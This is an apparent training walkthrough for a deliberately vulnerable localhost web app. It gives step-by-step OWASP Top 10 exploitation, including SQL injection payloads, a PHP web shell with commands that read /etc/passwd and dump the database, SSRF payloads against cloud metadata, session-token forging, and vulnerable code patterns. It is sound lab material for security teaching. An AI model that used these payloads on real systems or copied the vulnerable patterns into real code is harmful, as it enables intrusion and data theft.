# W Corp Employee Portal - Vulnerability Documentation

## Overview
The W Corp Employee Portal is a web application designed for employee management and document sharing. This document outlines the security vulnerabilities present in the system for educational and testing purposes.

## Access Information
- **URL:** http://localhost:3000/wcorp/
- **Database:** MySQL 8.0 (localhost:3306)
- **Legacy System:** http://localhost:3000/wcorp/legacy-login.html

## Default Credentials
- **Administrator:** admin / admin123
- **Employee:** john.doe / password123
- **Employee:** jane.smith / qwerty

## OWASP Top 10 Vulnerabilities

### A01 - Broken Access Control (IDOR)

**Description:** The application fails to properly validate user permissions when accessing resources, allowing users to access data belonging to other users.

**Location:** 
- `/wcorp/profile.html?id=X` - User profile access
- `/api/user/profile/:id` - API endpoint
- `/api/user/sensitive/:id` - Sensitive data access
- `/api/user/notes/:id` - Internal notes access

**Step-by-Step Exploitation:**

**Step 1: Access the Application**
1. Open your web browser
2. Navigate to: `http://localhost:3000/wcorp/`
3. Click on "Employee Login"

**Step 2: Login with Valid Credentials**
1. Enter username: `john.doe`
2. Enter password: `password123`
3. Click "Sign In"
4. You will be redirected to the employee portal

**Step 3: Access Your Own Profile**
1. In the portal, click "My Profile" or navigate to: `http://localhost:3000/wcorp/profile.html?id=2`
2. Observe your profile information is displayed

**Step 4: Exploit IDOR Vulnerability**
1. In the browser address bar, change the URL from:
   `http://localhost:3000/wcorp/profile.html?id=2`
   to:
   `http://localhost:3000/wcorp/profile.html?id=1`
2. Press Enter
3. Observe that you can now see the admin profile (ID 1)

**Step 5: Access Other User Profiles**
1. Try accessing different user IDs:
   - `http://localhost:3000/wcorp/profile.html?id=3` (jane.smith)
   - `http://localhost:3000/wcorp/profile.html?id=4` (bob.wilson)
   - `http://localhost:3000/wcorp/profile.html?id=5` (alice.brown)

**Step 6: Observe Sensitive Data Exposure**
1. Notice that sensitive data (SSN, credit card numbers) is exposed
2. Internal notes containing confidential information are visible
3. No authorization check prevents access to other users' data

**Impact:** 
- Unauthorized access to personal information
- Exposure of sensitive data (SSN, credit card numbers)
- Access to confidential internal notes
- Potential data breach

**Vulnerable Code Pattern:**
```javascript
// No authorization check
app.get('/api/user/profile/:id', async (req, res) => {
  const userId = req.params.id;
  const result = await getUserProfile(userId);
  res.json(result);
});
```

---

### A02 - Cryptographic Failures

**Description:** The application stores passwords in plain text without proper hashing or encryption, making them easily readable if the database is compromised.

**Location:**
- User registration endpoint
- Database storage
- Login authentication

**Step-by-Step Exploitation:**

**Step 1: Access the Registration Page**
1. Open your web browser
2. Navigate to: `http://localhost:3000/wcorp/`
3. Click on "New Employee Registration"

**Step 2: Register a New User**
1. Enter username: `testuser`
2. Enter email: `test@example.com`
3. Enter password: `mypassword123`
4. Confirm password: `mypassword123`
5. Click "Create Account"
6. Note the success message

**Step 3: Verify Password Storage (Method 1 - SQL Injection)**
1. Navigate to: `http://localhost:3000/wcorp/legacy-login.html`
2. In the username field, enter: `testuser' UNION SELECT username,password,3,4,5,6,7 FROM users --`
3. In the password field, enter: `anything`
4. Click "Login to Legacy System"
5. Observe the response shows plain text passwords

**Step 4: Verify Password Storage (Method 2 - Direct Database Access)**
1. If you have database access, connect to MySQL:
   ```bash
   mysql -h localhost -P 3306 -u wcorp_user -pwcorp_pass wcorp_db
   ```
2. Execute the query:
   ```sql
   SELECT username, password FROM users;
   ```
3. Observe all passwords are stored in plain text

**Step 5: Verify Password Storage (Method 3 - API Response)**
1. Use curl to test the registration endpoint:
   ```bash
   curl -X POST http://localhost:3000/api/register \
     -H "Content-Type: application/json" \
     -d '{"username":"testuser2","email":"test2@example.com","password":"plaintext123"}'
   ```
2. Check the database to confirm the password is stored in plain text

**Impact:**
- Password compromise if database is breached
- Easy credential harvesting
- No protection against rainbow table attacks
- Violation of security best practices

**Vulnerable Code Pattern:**
```javascript
// Plain text password storage
const [result] = await db.execute(
  'INSERT INTO users (username, email, password, role) VALUES (?, ?, ?, ?)',
  [username, email, password, 'user'] // password stored in plain text
);
```

---

### A03 - Injection (SQL Injection)

**Description:** The PHP legacy system uses raw SQL queries without prepared statements, allowing malicious SQL code to be injected through user input.

**Location:**
- http://localhost:3000/wcorp/legacy-login.html
- Legacy login form

**Step-by-Step Exploitation:**

**Step 1: Access the Legacy Login Page**
1. Open your web browser
2. Navigate to: `http://localhost:3000/wcorp/legacy-login.html`
3. Observe the legacy system interface

**Step 2: Basic Authentication Bypass**
1. In the username field, enter: `admin' OR '1'='1' --`
2. In the password field, enter: `anything`
3. Click "Login to Legacy System"
4. Observe that you are logged in successfully without valid credentials
5. You will be redirected to the admin panel or user portal

**Step 3: Extract User Data**
1. Clear the form and try a different payload
2. In the username field, enter: `admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users --`
3. In the password field, enter: `anything`
4. Click "Login to Legacy System"
5. Observe the response contains all user data including passwords

**Step 4: Database Schema Enumeration**
1. Clear the form and try another payload
2. In the username field, enter: `admin' UNION SELECT table_name,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema='wcorp_db' --`
3. In the password field, enter: `anything`
4. Click "Login to Legacy System"
5. Observe the database schema information

**Step 5: Advanced Data Extraction**
1. Try extracting specific sensitive data:
   ```
   Username: admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users WHERE role='admin' --
   Password: anything
   ```

**Step 6: Test with Different Payloads**
1. Try these additional payloads:
   ```
   Username: ' OR '1'='1' --
   Password: anything
   
   Username: admin'--
   Password: anything
   
   Username: admin' OR 1=1#
   Password: anything
   ```

**Impact:**
- Authentication bypass
- Data extraction
- Database schema enumeration
- Potential remote code execution
- Complete database compromise

**Vulnerable Code Pattern:**
```javascript
// Raw SQL query without prepared statements
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
const [results] = await db.execute(sql);
```

---

### A05 - Security Misconfiguration

**Description:** The application exposes sensitive configuration files and information that should be protected from public access.

**Location:**
- http://localhost:3000/.env
- http://localhost:3000/package.json
- http://localhost:8080/info.php
- HTML source code comments
- robots.txt and sitemap.xml

**Step-by-Step Exploitation:**

**Step 1: Environment File Exposure**
1. Open your web browser or use curl
2. Navigate to: `http://localhost:3000/.env`
3. Observe the exposed environment variables including:
   - Database credentials
   - JWT secret
   - Application configuration

**Step 2: Package Information Exposure**
1. Navigate to: `http://localhost:3000/package.json`
2. Observe the exposed package information including:
   - Dependencies and versions
   - Application metadata
   - Scripts and configuration

**Step 3: Source Code Analysis**
1. Navigate to: `http://localhost:3000/wcorp/`
2. Right-click and select "View Page Source"
3. Look for HTML comments revealing internal information:
   ```html
   <!-- Internal Note: Employee portal access at /portal, admin panel at /admin -->
   <!-- Database: MySQL on internal network, credentials in config files -->
   <!-- File uploads stored in /uploads directory with public access -->
   <!-- Session management uses predictable tokens for performance -->
   <!-- API endpoints available at /api/ for internal use -->
   <!-- PHP legacy system running on port 8080 for legacy applications -->
   ```

**Step 4: Directory Enumeration**
1. Navigate to: `http://localhost:3000/robots.txt`
2. Observe the exposed directory structure
3. Navigate to: `http://localhost:3000/sitemap.xml`
4. Observe the complete application structure

**Step 5: WCorp Specific Information**
1. Navigate to: `http://localhost:3000/wcorp/robots.txt`
2. Observe the WCorp-specific directory structure
3. Navigate to: `http://localhost:3000/wcorp/sitemap.xml`
4. Observe the WCorp application structure

**Step 6: Configuration File Access**
1. Try accessing common configuration files:
   ```
   http://localhost:3000/config.json
   http://localhost:3000/settings.json
   http://localhost:3000/.htaccess
   ```

**Step 7: Backup File Discovery**
1. Try accessing common backup file extensions:
   ```
   http://localhost:3000/backup.sql
   http://localhost:3000/database.sql
   http://localhost:3000/config.bak
   ```

**Impact:**
- Database credentials exposure
- System architecture disclosure
- Technology stack identification
- Internal network information
- Configuration weaknesses

**Vulnerable Code Pattern:**
```javascript
// Exposed environment file
app.get('/.env', (req, res) => {
  res.json({
    NODE_ENV: process.env.NODE_ENV,
    DB_HOST: process.env.DB_HOST,
    DB_USER: process.env.DB_USER,
    DB_PASSWORD: process.env.DB_PASSWORD,
    JWT_SECRET: process.env.JWT_SECRET
  });
});
```

---

### A07 - Identification and Authentication Failures

**Description:** The application uses predictable session tokens and lacks proper rate limiting on authentication attempts.

**Location:**
- Login endpoint
- Session management
- Token generation

**Step-by-Step Exploitation:**

**Step 1: Login and Capture Session Token**
1. Open your web browser
2. Navigate to: `http://localhost:3000/wcorp/`
3. Click "Employee Login"
4. Enter username: `john.doe`
5. Enter password: `password123`
6. Click "Sign In"
7. You will be redirected to the portal

**Step 2: Analyze Session Token**
1. Open browser developer tools (F12)
2. Go to the "Application" or "Storage" tab
3. Click on "Local Storage" in the left sidebar
4. Select `http://localhost:3000`
5. Look for the "token" key
6. Copy the token value (e.g., `MS1wcmVkaWN0YWJsZV9zZWNyZXRfS2V5XzEyMy0xNzA0MDY3MjAwMDAw`)

**Step 3: Decode and Analyze Token**
1. The token is base64 encoded
2. Decode it using an online base64 decoder or command line:
   ```bash
   echo "MS1wcmVkaWN0YWJsZV9zZWNyZXRfS2V5XzEyMy0xNzA0MDY3MjAwMDAw" | base64 -d
   ```
3. Observe the decoded format: `1-predictable_secret_key_123-1704067200000`
4. Notice the predictable pattern: `userId-secret-timestamp`

**Step 4: Test Token Predictability**
1. Logout and login again with the same user
2. Check the new token
3. Notice the timestamp changes but the pattern remains the same
4. Try logging in with a different user (admin/admin123)
5. Observe the token pattern: `1-predictable_secret_key_123-[timestamp]`

**Step 5: Test Rate Limiting**
1. Navigate to: `http://localhost:3000/wcorp/login.html`
2. Enter invalid credentials multiple times:
   - Username: `invalid`
   - Password: `wrong`
3. Click "Sign In" repeatedly (10+ times)
4. Observe no account lockout or rate limiting
5. Notice you can attempt unlimited login attempts

**Step 6: Session Hijacking Simulation**
1. Login as one user (john.doe)
2. Copy the session token
3. Open a new browser window/tab
4. Navigate to: `http://localhost:3000/wcorp/portal.html`
5. Open developer tools and go to Local Storage
6. Replace the token with the copied token
7. Refresh the page
8. Observe you are now logged in as the other user

**Step 7: Token Manipulation**
1. Try creating a token for a different user ID:
   ```javascript
   // In browser console
   const userId = 1; // admin user
   const secret = 'predictable_secret_key_123';
   const timestamp = Date.now();
   const token = btoa(`${userId}-${secret}-${timestamp}`);
   localStorage.setItem('token', token);
   localStorage.setItem('user', JSON.stringify({id: 1, username: 'admin', role: 'admin'}));
   ```
2. Refresh the page
3. Observe you are now logged in as admin

**Impact:**
- Session hijacking
- Brute force attacks
- Account enumeration
- Predictable authentication

**Vulnerable Code Pattern:**
```javascript
// Predictable session token generation
function generatePredictableToken(userId) {
  const secret = process.env.JWT_SECRET || 'predictable_secret_key_123';
  return Buffer.from(`${userId}-${secret}-${Date.now()}`).toString('base64');
}
```

---

### A08 - Software and Data Integrity Failures

**Description:** The file upload system lacks proper validation, allowing malicious files to be uploaded and executed.

**Location:**
- http://localhost:3000/wcorp/legacy-upload.html
- File upload functionality

**Step-by-Step Exploitation:**

**Step 1: Create a Web Shell**
1. Open a text editor (Notepad, VS Code, etc.)
2. Create a new file named `shell.php`
3. Add the following PHP code:
   ```php
   <?php
   if (isset($_GET['cmd'])) {
       echo "<pre>";
       system($_GET['cmd']);
       echo "</pre>";
   }
   ?>
   ```
4. Save the file

**Step 2: Access the Upload Page**
1. Open your web browser
2. Navigate to: `http://localhost:3000/wcorp/legacy-upload.html`
3. Observe the legacy upload interface

**Step 3: Upload the Web Shell**
1. Click "Choose File" or drag and drop the `shell.php` file
2. Click "Upload File"
3. Note the success message and file location
4. The file will be uploaded to `/uploads/` directory

**Step 4: Locate the Uploaded File**
1. The file will be renamed with a timestamp prefix
2. Note the new filename (e.g., `1704067200000-shell.php`)
3. The file will be accessible at: `http://localhost:3000/uploads/[filename]`

**Step 5: Test Basic Command Execution**
1. Navigate to: `http://localhost:3000/uploads/shell.php?cmd=whoami`
2. Observe the command output showing the current user
3. Try other basic commands:
   ```
   http://localhost:3000/uploads/shell.php?cmd=id
   http://localhost:3000/uploads/shell.php?cmd=pwd
   http://localhost:3000/uploads/shell.php?cmd=uname -a
   ```

**Step 6: Explore the File System**
1. List directory contents:
   ```
   http://localhost:3000/uploads/shell.php?cmd=ls -la
   ```
2. Navigate to different directories:
   ```
   http://localhost:3000/uploads/shell.php?cmd=ls -la /
   http://localhost:3000/uploads/shell.php?cmd=ls -la /app
   ```

**Step 7: Access System Information**
1. View system information:
   ```
   http://localhost:3000/uploads/shell.php?cmd=cat /etc/passwd
   http://localhost:3000/uploads/shell.php?cmd=cat /proc/version
   http://localhost:3000/uploads/shell.php?cmd=env
   ```

**Step 8: Database Access and Exfiltration**
1. Check if MySQL client is available:
   ```
   http://localhost:3000/uploads/shell.php?cmd=which mysql
   ```
2. Dump the database:
   ```
   http://localhost:3000/uploads/shell.php?cmd=mysqldump -u wcorp_user -pwcorp_pass wcorp_db
   ```
3. Access database directly:
   ```
   http://localhost:3000/uploads/shell.php?cmd=mysql -u wcorp_user -pwcorp_pass wcorp_db -e "SELECT * FROM users;"
   ```

**Step 9: Network Reconnaissance**
1. Check network interfaces:
   ```
   http://localhost:3000/uploads/shell.php?cmd=ifconfig
   ```
2. Check open ports:
   ```
   http://localhost:3000/uploads/shell.php?cmd=netstat -tulpn
   ```

**Step 10: Persistent Access**
1. Create additional backdoors:
   ```
   http://localhost:3000/uploads/shell.php?cmd=cp shell.php backup.php
   ```
2. Set up cron jobs for persistence (if possible):
   ```
   http://localhost:3000/uploads/shell.php?cmd=crontab -l
   ```

**Impact:**
- Remote code execution
- System compromise
- Data exfiltration
- Persistent backdoor installation
- Complete server control

**Vulnerable Code Pattern:**
```javascript
// No file type validation
const fileInfo = {
  filename: req.file.filename,
  originalName: req.file.originalname,
  size: req.file.size,
  path: req.file.path
};
```

---

### A10 - Server-Side Request Forgery (SSRF)

**Description:** The application fetches data from user-provided URLs without proper validation, allowing internal network access.

**Location:**
- `/api/fetch-url?url=` endpoint
- "Test Network Connection" button in portal

**Step-by-Step Exploitation:**

**Step 1: Access the Employee Portal**
1. Open your web browser
2. Navigate to: `http://localhost:3000/wcorp/`
3. Click "Employee Login"
4. Enter username: `john.doe`
5. Enter password: `password123`
6. Click "Sign In"
7. You will be redirected to the employee portal

**Step 2: Locate the SSRF Functionality**
1. In the employee portal, look for the "Test Network Connection" button
2. Click on "Test Network Connection"
3. Observe the response showing internal system information

**Step 3: Test Internal Resource Access**
1. Open a new browser tab
2. Navigate to: `http://localhost:3000/api/fetch-url?url=http://localhost:3000/.env`
3. Observe the exposed environment variables
4. Try accessing other internal resources:
   ```
   http://localhost:3000/api/fetch-url?url=http://localhost:3000/package.json
   http://localhost:3000/api/fetch-url?url=http://localhost:3000/robots.txt
   ```

**Step 4: Test File System Access**
1. Try accessing local files:
   ```
   http://localhost:3000/api/fetch-url?url=file:///etc/passwd
   http://localhost:3000/api/fetch-url?url=file:///etc/hosts
   http://localhost:3000/api/fetch-url?url=file:///proc/version
   ```

**Step 5: Internal Network Scanning**
1. Test internal services:
   ```
   http://localhost:3000/api/fetch-url?url=http://localhost:3306
   http://localhost:3000/api/fetch-url?url=http://127.0.0.1:3000
   http://localhost:3000/api/fetch-url?url=http://localhost:22
   ```

**Step 6: Test with Different Protocols**
1. Try different URL schemes:
   ```
   http://localhost:3000/api/fetch-url?url=ftp://localhost
   http://localhost:3000/api/fetch-url?url=gopher://localhost
   http://localhost:3000/api/fetch-url?url=dict://localhost
   ```

**Step 7: Cloud Metadata Access (Simulation)**
1. Try accessing cloud metadata endpoints:
   ```
   http://localhost:3000/api/fetch-url?url=http://169.254.169.254/
   http://localhost:3000/api/fetch-url?url=http://169.254.169.254/metadata/
   http://localhost:3000/api/fetch-url?url=http://169.254.169.254/latest/meta-data/
   ```

**Step 8: Test with Malformed URLs**
1. Try URL encoding and other techniques:
   ```
   http://localhost:3000/api/fetch-url?url=http://localhost:3000/.env%00
   http://localhost:3000/api/fetch-url?url=http://localhost:3000/.env#
   http://localhost:3000/api/fetch-url?url=http://localhost:3000/.env?
   ```

**Step 9: Test with Redirects**
1. Try URLs that might redirect:
   ```
   http://localhost:3000/api/fetch-url?url=http://localhost:3000/redirect
   http://localhost:3000/api/fetch-url?url=http://localhost:3000/admin
   ```

**Step 10: Advanced SSRF Techniques**
1. Try using different IP representations:
   ```
   http://localhost:3000/api/fetch-url?url=http://127.0.0.1:3000/.env
   http://localhost:3000/api/fetch-url?url=http://0.0.0.0:3000/.env
   http://localhost:3000/api/fetch-url?url=http://[::1]:3000/.env
   ```

**Step 11: Test Error Handling**
1. Try invalid URLs to see error responses:
   ```
   http://localhost:3000/api/fetch-url?url=http://invalid-domain
   http://localhost:3000/api/fetch-url?url=http://localhost:99999
   http://localhost:3000/api/fetch-url?url=not-a-url
   ```

**Impact:**
- Internal network access
- Sensitive file exposure
- Service enumeration
- Cloud metadata access
- Potential lateral movement

**Vulnerable Code Pattern:**
```javascript
// No URL validation
app.get('/api/fetch-url', async (req, res) => {
  const { url } = req.query;
  const response = await axios.get(url); // No validation
  res.json(response.data);
});
```

---

## Complete Attack Scenario

### Phase 1: Reconnaissance
1. **Information Gathering:**
   - Analyze robots.txt and sitemap.xml
   - Examine HTML source code comments
   - Identify exposed configuration files

2. **Technology Stack Identification:**
   - Node.js Express backend
   - MySQL database
   - PHP legacy system
   - React frontend

### Phase 2: Initial Access
1. **SQL Injection:**
   - Use SQL injection to bypass authentication
   - Extract user credentials and sensitive data

2. **File Upload:**
   - Upload PHP web shell
   - Establish remote code execution

### Phase 3: Privilege Escalation
1. **IDOR Exploitation:**
   - Access admin profiles and sensitive data
   - Extract internal notes and confidential information

2. **Session Manipulation:**
   - Exploit predictable session tokens
   - Hijack user sessions

### Phase 4: Data Exfiltration
1. **Database Dump:**
   - Use web shell to dump entire database
   - Extract all user data and sensitive information

2. **File System Access:**
   - Access configuration files
   - Extract system information

### Phase 5: Persistence
1. **Backdoor Installation:**
   - Maintain access through web shell
   - Create additional persistence mechanisms

## Mitigation Strategies

### For Each Vulnerability:

1. **A01 - Broken Access Control:**
   - Implement proper authorization checks
   - Use role-based access control (RBAC)
   - Validate user permissions for each request

2. **A02 - Cryptographic Failures:**
   - Use strong password hashing (bcrypt, Argon2)
   - Implement proper key management
   - Use HTTPS for all communications

3. **A03 - Injection:**
   - Use prepared statements
   - Implement input validation
   - Use parameterized queries

4. **A05 - Security Misconfiguration:**
   - Remove sensitive files from web root
   - Implement proper access controls
   - Use security headers

5. **A07 - Authentication Failures:**
   - Implement rate limiting
   - Use secure session management
   - Implement multi-factor authentication

6. **A08 - Data Integrity Failures:**
   - Implement file type validation
   - Use virus scanning
   - Implement file size limits

7. **A10 - SSRF:**
   - Implement URL validation
   - Use allowlists for internal resources
   - Implement network segmentation

## Testing Tools

### Recommended Tools:
- **Burp Suite** - Web application testing
- **OWASP ZAP** - Security scanning
- **SQLMap** - SQL injection testing
- **Nmap** - Network scanning
- **curl/wget** - Manual testing

### Example Commands:

**SQL Injection Testing:**
```bash
# Test the legacy login endpoint
sqlmap -u "http://localhost:3000/api/legacy-login" \
  --data '{"username":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbs

# Test the search endpoint
sqlmap -u "http://localhost:3000/api/search" \
  --data '{"query":"test"}' \
  --headers="Content-Type: application/json" \
  --dbs
```

**Directory Enumeration:**
```bash
# Enumerate WCorp directories
dirb http://localhost:3000/wcorp/ /usr/share/wordlists/dirb/common.txt

# Enumerate main application
dirb http://localhost:3000/ /usr/share/wordlists/dirb/common.txt

# Use gobuster for faster enumeration
gobuster dir -u http://localhost:3000/wcorp/ -w /usr/share/wordlists/dirb/common.txt
```

**Port Scanning:**
```bash
# Scan localhost for open ports
nmap -sV localhost

# Scan specific ports
nmap -p 3000,3306,8080 localhost

# Aggressive scan
nmap -A localhost
```

**Manual API Testing:**
```bash
# Test login endpoint
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Test registration endpoint
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"test@example.com","password":"testpass"}'

# Test IDOR vulnerability
curl -X GET http://localhost:3000/api/user/profile/1 \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"

# Test SSRF endpoint
curl -X GET "http://localhost:3000/api/fetch-url?url=http://localhost:3000/.env"
```

**File Upload Testing:**
```bash
# Test file upload
curl -X POST http://localhost:3000/api/upload \
  -F "file=@shell.php"

# Test with different file types
curl -X POST http://localhost:3000/api/upload \
  -F "file=@test.txt"

curl -X POST http://localhost:3000/api/upload \
  -F "file=@test.jpg"
```

**Session Token Analysis:**
```bash
# Login and capture token
TOKEN=$(curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')

# Decode token
echo $TOKEN | base64 -d

# Use token for authenticated requests
curl -X GET http://localhost:3000/api/user/profile/1 \
  -H "Authorization: Bearer $TOKEN"
```

## Legal and Ethical Considerations

⚠️ **Important:** This system is designed for educational and authorized testing purposes only. 

- Only test on systems you own or have explicit permission to test
- Do not use these techniques on production systems without authorization
- Respect privacy and data protection laws
- Follow responsible disclosure practices

## Conclusion

The W Corp Employee Portal demonstrates multiple OWASP Top 10 vulnerabilities in a realistic corporate environment. Understanding these vulnerabilities and their exploitation techniques is crucial for:

- Security professionals conducting penetration tests
- Developers learning secure coding practices
- Organizations improving their security posture
- Students studying cybersecurity

Remember that security is an ongoing process, and these vulnerabilities should be addressed through proper security controls, regular testing, and continuous monitoring.
